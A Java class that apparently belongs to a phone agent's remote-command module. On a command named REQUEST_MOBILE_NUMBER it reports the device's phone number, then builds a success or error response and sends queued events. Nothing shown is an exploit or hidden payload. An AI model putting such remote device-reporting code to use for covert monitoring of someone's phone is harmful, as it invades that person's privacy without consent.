package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.reportnumber.ReportPhoneNumberListener;
import com.vvt.reportnumber.ReportPhoneNumberOnDemand;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCRequestMobileNumber extends PCCRmtCmdSync implements ReportPhoneNumberListener {

	private final String TAG = "PCCRequestMobileNumber";
	private SendEventManager eventSender = Global.getSendEventManager();
	private ReportPhoneNumberOnDemand reportNumber = new ReportPhoneNumberOnDemand();
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.REQUEST_MOBILE_NUMBER.getId());		
		try {
			reportNumber.addReportPhoneNumberListener(this);
			reportNumber.reportPhoneNumber();
		} catch(Exception e) {
			reportNumber.removeReportPhoneNumberListener(this);
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
			createSystemEventOut(responseMessage.toString());	
			// To send events
			eventSender.sendEvents();
			Log.error(TAG + ".execute()", e.getMessage());
		}
	}

	// ReportPhoneNumberListener
	public void onError(String error) {
		reportNumber.removeReportPhoneNumberListener(this);
		doPCCHeader(PhoenixCompliantCommand.REQUEST_MOBILE_NUMBER.getId());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(error);
		createSystemEventOut(responseMessage.toString());
		observer.cmdExecutedError(this);
		// To send events
		eventSender.sendEvents();
		Log.error(TAG + ".onError()", error);
	}

	public void onSuccess() {
		reportNumber.removeReportPhoneNumberListener(this);
		doPCCHeader(PhoenixCompliantCommand.REQUEST_MOBILE_NUMBER.getId());
		responseMessage.append(Constant.OK);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(RmtCmdTextResource.REQUEST_MOBILE_NUMBER_SUCCESS);
		createSystemEventOut(responseMessage.toString());
		observer.cmdExecutedSuccess(this);
		// To send events
		eventSender.sendEvents();
	}
}
